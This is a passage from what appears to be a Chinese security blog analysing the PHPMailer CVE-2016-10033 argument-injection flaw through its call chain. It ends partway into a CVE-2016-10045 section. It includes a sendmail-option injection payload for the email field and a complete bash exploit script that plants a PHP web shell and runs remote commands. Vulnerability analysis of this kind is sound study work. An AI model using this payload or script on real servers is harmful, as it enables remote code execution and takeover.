<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">setFrom</span><span class="params">($address, $name = <span class="string">''</span>, $auto = true)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $address = trim($address);</span><br><span class="line">    $name = trim(preg_replace(<span class="string">'/[\r\n]+/'</span>, <span class="string">''</span>, $name)); <span class="comment">//Strip breaks and trim</span></span><br><span class="line">    <span class="comment">// Don't validate now addresses with IDN. Will be done in send().</span></span><br><span class="line">    <span class="keyword">if</span> (($pos = strrpos($address, <span class="string">'@'</span>)) === <span class="keyword">false</span> <span class="keyword">or</span></span><br><span class="line">        (!<span class="keyword">$this</span>-&gt;has8bitChars(substr($address, ++$pos)) <span class="keyword">or</span> !<span class="keyword">$this</span>-&gt;idnSupported()) <span class="keyword">and</span></span><br><span class="line">        !<span class="keyword">$this</span>-&gt;validateAddress($address)) &#123;</span><br><span class="line">        $error_message = <span class="keyword">$this</span>-&gt;lang(<span class="string">'invalid_address'</span>) . <span class="string">" (setFrom) $address"</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;setError($error_message);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;edebug($error_message);</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;exceptions) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> phpmailerException($error_message);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;From = $address;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;FromName = $name;</span><br><span class="line">    <span class="keyword">if</span> ($auto) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;Sender)) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;Sender = $address;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>我们跟进去validateAddress()函数，看下是怎么处理的。这里\$patternselect未传进来即值默认为null，然后将\$validator的值赋给\$patternselect即为’auto’，进入后面的逻辑开始判断是否有pcre插件，若无pcre则判断php版本是否小于5.2.0，若是则将\$patternselect重新赋值为’noregex’；而在后面switch语句的noregex逻辑中，是简单地根据@符号来处理输入的邮箱字符串的：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">validateAddress</span><span class="params">($address, $patternselect = null)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (is_null($patternselect)) &#123;</span><br><span class="line">        $patternselect = <span class="keyword">self</span>::$validator;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (is_callable($patternselect)) &#123;</span><br><span class="line">        <span class="keyword">return</span> call_user_func($patternselect, $address);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//Reject line breaks in addresses; it's valid RFC5322, but not RFC5321</span></span><br><span class="line">    <span class="keyword">if</span> (strpos($address, <span class="string">"\n"</span>) !== <span class="keyword">false</span> <span class="keyword">or</span> strpos($address, <span class="string">"\r"</span>) !== <span class="keyword">false</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!$patternselect <span class="keyword">or</span> $patternselect == <span class="string">'auto'</span>) &#123;</span><br><span class="line">        <span class="comment">//Check this constant first so it works when extension_loaded() is disabled by safe mode</span></span><br><span class="line">        <span class="comment">//Constant was added in PHP 5.2.4</span></span><br><span class="line">        <span class="keyword">if</span> (defined(<span class="string">'PCRE_VERSION'</span>)) &#123;</span><br><span class="line">            <span class="comment">//This pattern can get stuck in a recursive loop in PCRE &lt;= 8.0.2</span></span><br><span class="line">            <span class="keyword">if</span> (version_compare(PCRE_VERSION, <span class="string">'8.0.3'</span>) &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">                $patternselect = <span class="string">'pcre8'</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $patternselect = <span class="string">'pcre'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (function_exists(<span class="string">'extension_loaded'</span>) <span class="keyword">and</span> extension_loaded(<span class="string">'pcre'</span>)) &#123;</span><br><span class="line">            <span class="comment">//Fall back to older PCRE</span></span><br><span class="line">            $patternselect = <span class="string">'pcre'</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">//Filter_var appeared in PHP 5.2.0 and does not require the PCRE extension</span></span><br><span class="line">            <span class="keyword">if</span> (version_compare(PHP_VERSION, <span class="string">'5.2.0'</span>) &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">                $patternselect = <span class="string">'php'</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $patternselect = <span class="string">'noregex'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">switch</span> ($patternselect) &#123;</span><br><span class="line">        ...</span><br><span class="line">        <span class="keyword">case</span> <span class="string">'noregex'</span>:</span><br><span class="line">            <span class="comment">//No PCRE! Do something _very_ approximate!</span></span><br><span class="line">            <span class="comment">//Check the address is 3 chars or longer and contains an @ that's not the first or last char</span></span><br><span class="line">            <span class="keyword">return</span> (strlen($address) &gt;= <span class="number">3</span></span><br><span class="line">                <span class="keyword">and</span> strpos($address, <span class="string">'@'</span>) &gt;= <span class="number">1</span></span><br><span class="line">                <span class="keyword">and</span> strpos($address, <span class="string">'@'</span>) != strlen($address) - <span class="number">1</span>);</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>至此可知，如果满足php版本低于5.2.0且无pcre插件，则我们只需要按照@符的处理进行构造即可。</p>
<p>再回看index.php中的代码，第二个也就是最后一个被调用的函数是\$mail-&gt;send()，找到对应的代码块，很明显，这里会调用到postSend()函数：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">send</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">$this</span>-&gt;preSend()) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;postSend();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (phpmailerException $exc) &#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mailHeader = <span class="string">''</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;setError($exc-&gt;getMessage());</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;exceptions) &#123;</span><br><span class="line">            <span class="keyword">throw</span> $exc;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>跟进postSend()函数，这里有个switch语句来匹配\$this-&gt;Mailer，然而在之前的代码逻辑中被没有对\$this-&gt;Mailer进行赋值，那么\$this-&gt;Mailer的值就是初始值mail；可以看到在匹配到mail的代码逻辑中会调用mailSend()函数：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">   <span class="comment">/**</span></span><br><span class="line"><span class="comment">    * Which method to use to send mail.</span></span><br><span class="line"><span class="comment">    * Options: "mail", "sendmail", or "smtp".</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@var</span> string</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">   <span class="keyword">public</span> $Mailer = <span class="string">'mail'</span>;</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">postSend</span><span class="params">()</span></span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">       <span class="keyword">try</span> &#123;</span><br><span class="line">           <span class="comment">// Choose the mailer and send through it</span></span><br><span class="line">           <span class="keyword">switch</span> (<span class="keyword">$this</span>-&gt;Mailer) &#123;</span><br><span class="line">               <span class="keyword">case</span> <span class="string">'sendmail'</span>:</span><br><span class="line">               <span class="keyword">case</span> <span class="string">'qmail'</span>:</span><br><span class="line">                   <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;sendmailSend(<span class="keyword">$this</span>-&gt;MIMEHeader, <span class="keyword">$this</span>-&gt;MIMEBody);</span><br><span class="line">               <span class="keyword">case</span> <span class="string">'smtp'</span>:</span><br><span class="line">                   <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;smtpSend(<span class="keyword">$this</span>-&gt;MIMEHeader, <span class="keyword">$this</span>-&gt;MIMEBody);</span><br><span class="line">               <span class="keyword">case</span> <span class="string">'mail'</span>:</span><br><span class="line">                   <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;mailSend(<span class="keyword">$this</span>-&gt;MIMEHeader, <span class="keyword">$this</span>-&gt;MIMEBody);</span><br><span class="line">               <span class="keyword">default</span>:</span><br><span class="line">                   $sendMethod = <span class="keyword">$this</span>-&gt;Mailer.<span class="string">'Send'</span>;</span><br><span class="line">                   <span class="keyword">if</span> (method_exists(<span class="keyword">$this</span>, $sendMethod)) &#123;</span><br><span class="line">                       <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;$sendMethod(<span class="keyword">$this</span>-&gt;MIMEHeader, <span class="keyword">$this</span>-&gt;MIMEBody);</span><br><span class="line">                   &#125;</span><br><span class="line">                   <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;mailSend(<span class="keyword">$this</span>-&gt;MIMEHeader, <span class="keyword">$this</span>-&gt;MIMEBody);</span><br><span class="line">           &#125;</span><br><span class="line">       &#125; <span class="keyword">catch</span> (phpmailerException $exc) &#123;</span><br><span class="line">           <span class="keyword">$this</span>-&gt;setError($exc-&gt;getMessage());</span><br><span class="line">           <span class="keyword">$this</span>-&gt;edebug($exc-&gt;getMessage());</span><br><span class="line">           <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;exceptions) &#123;</span><br><span class="line">               <span class="keyword">throw</span> $exc;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
<p>跟进mailSend()看看，关注到\$params，它是由\$this-&gt;Sender的值直接拼接而成的，最后传入mailPassthru()函数的第五个参数进行调用：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">mailSend</span><span class="params">($header, $body)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $toArr = <span class="keyword">array</span>();</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;to <span class="keyword">as</span> $toaddr) &#123;</span><br><span class="line">        $toArr[] = <span class="keyword">$this</span>-&gt;addrFormat($toaddr);</span><br><span class="line">    &#125;</span><br><span class="line">    $to = implode(<span class="string">', '</span>, $toArr);</span><br><span class="line">    $params = <span class="keyword">null</span>;</span><br><span class="line">    <span class="comment">//This sets the SMTP envelope sender which gets turned into a return-path header by the receiver</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;Sender)) &#123;</span><br><span class="line">        $params = sprintf(<span class="string">'-f%s'</span>, <span class="keyword">$this</span>-&gt;Sender);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;Sender != <span class="string">''</span> <span class="keyword">and</span> !ini_get(<span class="string">'safe_mode'</span>)) &#123;</span><br><span class="line">        $old_from = ini_get(<span class="string">'sendmail_from'</span>);</span><br><span class="line">        ini_set(<span class="string">'sendmail_from'</span>, <span class="keyword">$this</span>-&gt;Sender);</span><br><span class="line">    &#125;</span><br><span class="line">    $result = <span class="keyword">false</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;SingleTo <span class="keyword">and</span> count($toArr) &gt; <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">foreach</span> ($toArr <span class="keyword">as</span> $toAddr) &#123;</span><br><span class="line">            $result = <span class="keyword">$this</span>-&gt;mailPassthru($toAddr, <span class="keyword">$this</span>-&gt;Subject, $body, $header, $params);</span><br><span class="line">            <span class="keyword">$this</span>-&gt;doCallback($result, <span class="keyword">array</span>($toAddr), <span class="keyword">$this</span>-&gt;cc, <span class="keyword">$this</span>-&gt;bcc, <span class="keyword">$this</span>-&gt;Subject, $body, <span class="keyword">$this</span>-&gt;From);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $result = <span class="keyword">$this</span>-&gt;mailPassthru($to, <span class="keyword">$this</span>-&gt;Subject, $body, $header, $params);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;doCallback($result, <span class="keyword">$this</span>-&gt;to, <span class="keyword">$this</span>-&gt;cc, <span class="keyword">$this</span>-&gt;bcc, <span class="keyword">$this</span>-&gt;Subject, $body, <span class="keyword">$this</span>-&gt;From);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($old_from)) &#123;</span><br><span class="line">        ini_set(<span class="string">'sendmail_from'</span>, $old_from);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!$result) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> phpmailerException(<span class="keyword">$this</span>-&gt;lang(<span class="string">'instantiate'</span>), <span class="keyword">self</span>::STOP_CRITICAL);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>再跟进mailPassthru()函数看下，注意看第五个参数即\$params的调用过程，当safe_mode安全模式未开启、\$params不为空、\$this-&gt;UseSendmailOptions不为空时就将\$params作为第五个参数传入mail()函数中调用：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">   <span class="comment">/**</span></span><br><span class="line"><span class="comment">    * Whether mail() uses a fully sendmail-compatible MTA.</span></span><br><span class="line"><span class="comment">    * One which supports sendmail's "-oi -f" options.</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@var</span> boolean</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">   <span class="keyword">public</span> $UseSendmailOptions = <span class="keyword">true</span>;</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">mailPassthru</span><span class="params">($to, $subject, $body, $header, $params)</span></span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">       <span class="comment">//Check overloading of mail function to avoid double-encoding</span></span><br><span class="line">       <span class="keyword">if</span> (ini_get(<span class="string">'mbstring.func_overload'</span>) &amp; <span class="number">1</span>) &#123;</span><br><span class="line">           $subject = <span class="keyword">$this</span>-&gt;secureHeader($subject);</span><br><span class="line">       &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">           $subject = <span class="keyword">$this</span>-&gt;encodeHeader(<span class="keyword">$this</span>-&gt;secureHeader($subject));</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="comment">//Can't use additional_parameters in safe_mode</span></span><br><span class="line">       <span class="comment">//@link http://php.net/manual/en/function.mail.php</span></span><br><span class="line">       <span class="keyword">if</span> (ini_get(<span class="string">'safe_mode'</span>) <span class="keyword">or</span> !<span class="keyword">$this</span>-&gt;UseSendmailOptions <span class="keyword">or</span> is_null($params)) &#123;</span><br><span class="line">           $result = @mail($to, $subject, $body, $header);</span><br><span class="line">       &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">           $result = @mail($to, $subject, $body, $header, $params);</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">return</span> $result;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
<p>这里\$this-&gt;UseSendmailOptions默认初始值为true，且未经过其他赋值操作，因此只要安全模式不开启且\$params不为空即可进入<code>@mail($to, $subject, $body, $header, $params);</code>的逻辑。</p>
<p>至此，整个调用链我们都分析清楚了。由前面第一节的分析知道，mail()函数的第五个参数可以向sendmail程序添加额外参数来写shell，而这里第五个参数为\$params，其调用链为：index.php的email表单项–&gt;\$email–&gt;\$address–&gt;\$this-&gt;Sender–&gt;\$params。</p>
<h4 id="攻击利用"><a href="#攻击利用" class="headerlink" title="攻击利用"></a>攻击利用</h4><p>因此，我们在email表现进行类似第一小节的参数注入即可写入shell。在email表项填<code>a( -OQueueDirectory=/tmp -X/www/log-shell.php )@a.com</code>，在name表项或message表项中填入恶意PHP代码都可：</p>
<p><img src="/2019/07/04/浅谈escapeshellarg与参数注入/17.png" alt=""></p>
<p>等待sendmail程序响应一段时间后，访问log-shell.php即可触发恶意PHP代码：</p>
<p><img src="/2019/07/04/浅谈escapeshellarg与参数注入/18.png" alt=""></p>
<p>查看日志，确实写入了恶意PHP代码：</p>
<p><img src="/2019/07/04/浅谈escapeshellarg与参数注入/19.png" alt=""></p>
<p>当然，有exp脚本直接用就可以了：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="comment"># CVE-2016-10033 exploit by opsxcq</span></span><br><span class="line"><span class="comment"># https://github.com/opsxcq/exploit-CVE-2016-10033</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">'[+] CVE-2016-10033 exploit by opsxcq'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ -z <span class="string">"<span class="variable">$1</span>"</span> ]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">'[-] Please inform an host as parameter'</span></span><br><span class="line">    <span class="built_in">exit</span> -1</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ $(uname) == <span class="string">'Darwin'</span> ]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">    decoder=<span class="string">'base64 -D'</span></span><br><span class="line"><span class="keyword">elif</span> [ $(uname) == <span class="string">'Linux'</span> ]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">    decoder=<span class="string">'base64 -d'</span>  </span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">'[-] Your platform isnt supported: '</span>$(uname)</span><br><span class="line">    <span class="built_in">exit</span> -1</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">host=<span class="variable">$1</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">'[+] Exploiting '</span><span class="variable">$host</span></span><br><span class="line"></span><br><span class="line">curl -sq <span class="string">'http://'</span><span class="variable">$host</span> -H <span class="string">'Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryzXJpHSq4mNy35tHe'</span> --data-binary $<span class="string">'------WebKitFormBoundaryzXJpHSq4mNy35tHe\r\nContent-Disposition: form-data; name="action"\r\n\r\nsubmit\r\n------WebKitFormBoundaryzXJpHSq4mNy35tHe\r\nContent-Disposition: form-data; name="name"\r\n\r\n&lt;?php echo "|".base64_encode(system(base64_decode($_GET["cmd"])))."|"; ?&gt;\r\n------WebKitFormBoundaryzXJpHSq4mNy35tHe\r\nContent-Disposition: form-data; name="email"\r\n\r\n\"vulnerables\\\" -OQueueDirectory=/tmp -X/www/backdoor.php server\" @test.com\r\n------WebKitFormBoundaryzXJpHSq4mNy35tHe\r\nContent-Disposition: form-data; name="message"\r\n\r\nPwned\r\n------WebKitFormBoundaryzXJpHSq4mNy35tHe--\r\n'</span> &gt;/dev/null &amp;&amp; <span class="built_in">echo</span> <span class="string">'[+] Target exploited, acessing shell at http://'</span><span class="variable">$host</span><span class="string">'/backdoor.php'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">'[+] Checking if the backdoor was created on target system'</span></span><br><span class="line">code=$(curl -o /dev/null --silent --head --write-out <span class="string">'%&#123;http_code&#125;\n'</span> <span class="string">"http://<span class="variable">$host</span>/backdoor.php"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ <span class="string">"<span class="variable">$code</span>"</span> != <span class="string">"200"</span> ]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">'[-] Target cant be exploited'</span></span><br><span class="line">    <span class="built_in">exit</span> -1</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">'[+] Backdoor.php found on remote system'</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line">cmd=<span class="string">'whoami'</span></span><br><span class="line"><span class="keyword">while</span> [ <span class="string">"<span class="variable">$cmd</span>"</span> != <span class="string">'exit'</span> ]</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">'[+] Running '</span><span class="variable">$cmd</span></span><br><span class="line">    <span class="keyword">if</span> ! curl -sq http://<span class="variable">$host</span>/backdoor.php?cmd=$(<span class="built_in">echo</span> -ne <span class="variable">$cmd</span> | base64) | grep <span class="string">'|'</span> | grep -v <span class="string">'base64_encode'</span> | head -n 1 | cut -d <span class="string">'|'</span> -f 2 | <span class="variable">$decoder</span> </span><br><span class="line">    <span class="keyword">then</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">'[-] Connection problens'</span></span><br><span class="line">        <span class="built_in">exit</span> -1</span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line">    <span class="built_in">echo</span></span><br><span class="line">    <span class="built_in">read</span> -p <span class="string">'RemoteShell&gt; '</span> cmd</span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">'[+] Exiting'</span></span><br></pre></td></tr></table></figure>
<h3 id="CVE-2016-10045"><a href="#CVE-2016-10045" class="headerlink" title="CVE-2016-10045"></a>CVE-2016-10045</h3><p>环境：<a href="https://github.com/pedro823/cve-2016-10033-45/tree/master/5.2.18" target="_blank" rel="noopener">https://github.com/pedro823/cve-2016-10033-45/tree/master/5.2.18</a></p>
<p>前提条件：</p>
<ul>
<li>php版本 &lt; 5.2.0；</li>
<li>phpmailer版本 = 5.2.18；</li>
<li>php未安装pcre；</li>
<li>安全模式未开启即safe_mode = false（default）；</li>
</ul>
<p>界面和功能跟前面的一致：</p>
<p><img src="/2019/07/04/浅谈escapeshellarg与参数注入/22.png" alt=""></p>
<h4 id="代码审计-1"><a href="#代码审计-1" class="headerlink" title="代码审计"></a>代码审计</h4><p>和前面一样跟着调用链逐个分析函数，可明显看到官方对mailSend()函数进行了修改：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">mailSend</span><span class="params">($header, $body)</span></span></span><br><span class="line"><span 